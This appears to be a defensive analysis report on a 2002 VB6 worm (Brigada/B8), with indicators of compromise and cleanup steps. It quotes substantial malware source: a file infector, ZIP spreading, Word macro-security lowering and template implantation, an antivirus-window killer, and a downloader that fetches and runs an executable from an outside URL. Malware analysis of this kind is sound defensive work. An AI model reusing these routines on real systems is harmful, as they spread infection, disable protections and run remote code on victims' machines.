# 🛡️ Malware Analysis Report: VB.Brigada.Worm (B8)

![Analysis Date](https://img.shields.io/badge/analysis_date-2025--11--06-blue)
![Malware Type](https://img.shields.io/badge/type-VB6%20worm%20%2B%20file%20infector%20%2B%20ZIP%20spreader-red)
![Creation Date](https://img.shields.io/badge/created-2002--07--02-orange)

## Overview

Brigada (alias B8) is a VB6 hybrid that combines several vectors:
- Installer/persistence copying itself to Windows/System directories and setting Run/RunServices keys.
- "Virus" mode that appends a two‑byte marker ("b8") to EXEs and prepends its own header, then runs the original host.
- ZIP spreader using a bundled archiver to pack and seed a `brigada8.zip` and inject itself (`lolita.exe`) into found ZIPs.
- HTML harvesting from Temporary Internet Files looking for `mailto:` links (intended Outlook spamming).
- Word macro infection via Startup VBS after lowering Office macro protections and embedding an EXE OLE object.
- Downloader to fetch and run an update from a hard‑coded URL.

Primary source analyzed: `brigadaworm.final/B8.bas` (VB6 module).

> Historical malware analysis for research/education. Do not execute outside an isolated, lawful lab.

## Execution chain at a glance

1) Install: copies itself to `%WINDIR%\Ms0701i32.exe` and `%WINSYS%\lolita.exe`; seeds a RunServices entry with a random mode flag.
2) Branch by marker: if the current EXE ends with `b8` → treat as infected host and reconstruct/run the host; else run as worm:
   - Extracts embedded ZIP tool to `C:\piss.exe` and creates `C:\brigada8.zip` containing itself.
   - Depending on the random flag, executes one of: document infection (`-petikb8`), Windows EXE infection (`-alcopaulb8`), or immediate shutdown (`-trojanmode`).
   - Always starts email harvesting from Temporary Internet Files.
3) Downloader attempts to fetch `http://p0th0le.tripod.com/a.exe` to `C:\update.exe` and executes it.

---

## Install and persistence

```vb
vdir = App.Path: If Right(vdir,1) <> "\" Then vdir = vdir & "\"
FileCopy vdir & App.EXEName & ".exe", GetSpecialfolder(CSIDL_WIN) & "\Ms0701i32.exe"
FileCopy vdir & App.EXEName & ".exe", GetSpecialfolder(CSIDL_WINSYS) & "\lolita.exe"

Sub regcall()
  b = "-alcopaulb8": c = "-petikb8": d = "-trojanmode"
  regcol = Array(b, c, d): final = regcol(Int(Rnd * 3))
  ws.RegWrite "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices\\b8", _
              GetSpecialfolder(CSIDL_WINSYS) & "\\Ms0701i32.exe " & final
  If Dir("c:\\regedit.exe") <> "regedit.exe" Then
    FileCopy GetSpecialfolder(CSIDL_WIN) & "\\regedit.exe", "c:\\regedit.exe"
  End If
End Sub
```

Random flag dictates which feature path is activated on boot.

---

## Worm vs. virus mode switch (EXE file infector)

Marker and host extraction logic:

```vb
Open vdir & App.EXEName & ".exe" For Binary As #1
vc = Space(LOF(1)): Get #1, , vc: Close #1
mark = Right(vc, 2)
If mark <> "b8" Then
  ' Worm mode ...
Else
  ' Virus mode: run the host
  hostlen = LOF(4) - 75264
  virlen  = 75264
  Get #4, , buffvirlen   ' worm header
  Get #4, , buffhostlen  ' original host
  Open vdir & "XxX.exe" For Binary As #3: Put #3, , buffhostlen: Close #3
  idProg = Shell(vdir & "XxX.exe", vbNormalFocus)
  ' wait until host exits, then delete XxX.exe
End If
```

Infection of a target EXE writes: [worm header] + [original host] + `b8`.

```vb
Function infect(hostpath As String)
  Open hostpath For Binary As #1: Get #1, , hostcode: Close #1
  Open vir & App.EXEName & ".exe" For Binary As #2: Get #2, , header: Close #2
  f = "b8"
  Open hostpath For Binary As #3
    Put #3, , header: Put #3, , hostcode: Put #3, , f
  Close #3
End Function
```

Note: The constant `75264` assumes a fixed worm size; mismatch risks corrupting hosts.

---

## ZIP seeding and infection

Bundled archiver extraction and seeding:

```vb
Sub extrkzip()
  wormlen = LOF(1) - 63488: rarlen = 63488
  Get #1, , buffwormlen: Get #1, , buffrarlen
  Open "c:\\piss.exe" For Binary As #2: Put #2, , buffrarlen: Close #2
  Shell "c:\\piss.exe c:\\brigada8.zip " & vdir & App.EXEName & ".exe", vbHide
End Sub
```

ZIP infection walk:

```vb
Sub infection(dir)
  For Each fil In fso.GetFolder(dir).Files
    ext = LCase(fso.GetExtensionName(fil.Path))
    If ext = "zip" Then
      Shell "c:\\piss.exe " & fil.Path & " " & GetSpecialfolder(CSIDL_WINSYS) & "\\lolita.exe", vbHide
    End If
  Next
End Sub
```

---

## Email harvesting and mailing (bugs present)

Harvest from Temporary Internet Files and attempt to mail ZIP:

```vb
If Mid(q, j, 7) = "mailto:" Then
  mlto = "": cnt = 0
  Do While Mid(q, j + 7 + cnt, 1) <> """"
    mlto = mlto & Mid(q, j + 7 + cnt, 1)
    cnt = cnt + 1
  Loop
  Call Worming(mlto)
End If

Function Worming(mail As String)
  Set a = CreateObject("Outlook.Application")
  Set b = a.GetNameSpace("MAPI")
  If a = "Outlook" Then        ' BUG: object vs string; condition never true
    b.Logon "profile", "password"
    Set c = a.CreateItem(0)
    c.Recipients.Add mail
    c.Subject = "check us out"
    c.Body = "we exist to give everyone a smiley face... :)"
    c.Attachments.Add "c:\\brigada8.zip"
    c.Send: c.DeleteAfterSubmit = True
    b.Logoff
  End If
End Function
```

Due to the comparison bug, mailing likely doesn’t execute in practice.

---

## Document (Word) infection via Startup VBS

Lowers Word macro security and implants a `Document_Close` that writes a `Document_Open` which activates an embedded OLE EXE in the document. Then a Startup VBS plants this macro into Normal template:

```vb
' Lower security
Print #2, "[HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\10.0\\Word\\Security]"
Print #2, "\"Level\"=dword:00000001"
Print #2, "\"AccessVBOM\"=dword:00000001"

' Build c:\nl.tmp with macro that creates c:\xp.exp and embeds c:\XXXview.exe
FileCopy vdir & App.EXEName & ".exe", "c:\\XXXview.exe"

' Startup dropper to import macro to Normal.dot
Open GetSpecialfolder(CSIDL_STARTUP) & "\\startup.vbs" For Output As #6
Print #6, "Set oword = CreateObject(\"Word.Application\")"
Print #6, "Set nt = oword.NormalTemplate.vbproject.vbcomponents(1).codemodule"
Print #6, "Set iw = fso.OpenTextFile(\"c:\\nl.tmp\", 1, True)"
Print #6, "nt.DeleteLines 1, nt.CountOfLines"
Print #6, "Do While iw.atendofstream <> True: b = iw.readline: nt.InsertLines i, b: i = i + 1: Loop"
Print #6, "oword.NormalTemplate.Save: oword.quit"
Close #6
```

---

## Downloader and AV killer

```vb
Sub downloader()
  If InternetGetConnectedState(0&,0&) = 0 Then Exit Sub
  Form1.Inet1.RequestTimeout = 40
  databyte() = Form1.Inet1.OpenURL("http://p0th0le.tripod.com/a.exe", icByteArray)
  Open "c:\\update.exe" For Binary As #2: Put #2, , databyte(): Close #2
  Shell "c:\\update.exe", vbHide
End Sub

Sub killav()
  For Each av In Array("Pop3trap","JavaScan","Modem Booster","vettray","Timer","CD-Rom Monitor", _
                       "F-STOPW Version 5.06c","PC-cillin 2000 : Virus Alert","DAPDownloadManager", _
                       "Real-time Scan","IOMON98","AVP Monitor","NAI_VS_STAT")
    aWindow = FindWindow(vbNullString, av): PostMessage aWindow, WM_CLOSE, 0, 0
  Next
End Sub
```

Note: Downloader requires a VB6 Form `Form1` with `Inet` control (`Inet1`).

---

## Command-line switches

- `-petikb8`: Run Word macro infection (`wording`) and ZIP infection.
- `-alcopaulb8`: Run Windows directory EXE infection (`virustime`).
- `-trojanmode`: Shutdown Windows immediately.

A random one is chosen and persisted via RunServices by `regcall`.

---

## Indicators of Compromise (IoCs)

Files:
- `%WINDIR%\Ms0701i32.exe`
- `%WINSYS%\lolita.exe`
- `C:\piss.exe` (embedded archiver)
- `C:\brigada8.zip` (seed ZIP)
- `C:\update.exe` (downloaded payload)
- Startup: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\startup.vbs`
- `C:\XXXview.exe` (embedded into Word docs)

Registry:
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices\b8 = "<sysdir>\Ms0701i32.exe <flag>"`
- Word security lowered: `HKCU\Software\Microsoft\Office\9.0\Word\Security\Level = 1`, `HKCU\...\10.0\Word\Security\Level = 1`, `AccessVBOM = 1`

Artifacts/behavior:
- Infected EXEs end with trailing bytes `b8`; host reconstructed to `XxX.exe` when run.
- ZIP files gain an extra member `lolita.exe`.
- HTML scanning under Temporary Internet Files for `mailto:` patterns.

---

## Mitigation

1. Remove RunServices `b8` value; delete `%WINDIR%\Ms0701i32.exe` and `%WINSYS%\lolita.exe`.
2. Delete auxiliary files: `C:\piss.exe`, `C:\brigada8.zip`, `C:\update.exe`, Startup `startup.vbs`, and `C:\XXXview.exe`.
3. Restore Word macro security (disable AccessVBOM; re‑enable macro warnings) and clean Normal template and affected documents.
4. Scan/repair EXE files in `%WINDIR%` for appended `b8` marker and oversized headers; restore from known‑good copies.
5. Block Outlook COM automation from untrusted programs; enable programmatic access prompts.
6. Monitor for ZIP modifications and unexpected extra executables in archives.

## Notes

- The Outlook mailer contains a logic bug (`If a = "Outlook" Then`) that likely prevents email sending; other vectors (ZIP seeding, file infection, macro dropper) remain active.
- Fixed-size assumptions (`75264`/`63488`) make the file infector fragile; mismatches corrupt hosts.
- The code attempts to close a list of AV GUI windows by title; this is noisy and unreliable.

— Analysis based on `brigadaworm.final/B8.bas`, July 2, 2002.
